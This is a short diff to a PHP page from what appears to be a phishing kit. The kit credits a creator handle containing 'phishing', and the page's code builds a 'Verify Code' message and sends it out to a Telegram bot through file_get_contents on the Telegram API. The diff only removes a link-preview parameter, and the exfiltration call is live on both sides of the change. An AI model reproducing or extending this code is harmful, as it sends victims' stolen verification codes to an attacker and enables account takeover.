@@ -13,7 +13,7 @@ $text = "<-----Verify Code----->
 <---------Info--------->
 🌐 Host : @XTuranli
 👤 Creator : @Geladiator_phishing";
-file_get_contents("https://api.telegram.org/bot".$TOKEN."/SendMessage?chat_id=".$ID."&disable_web_page_preview=true&parse_mode=HTML&text=".urlencode($text));
+file_get_contents("https://api.telegram.org/bot".$TOKEN."/SendMessage?chat_id=".$ID."&parse_mode=HTML&text=".urlencode($text));
 ?>
 
 <!DOCTYPE html>
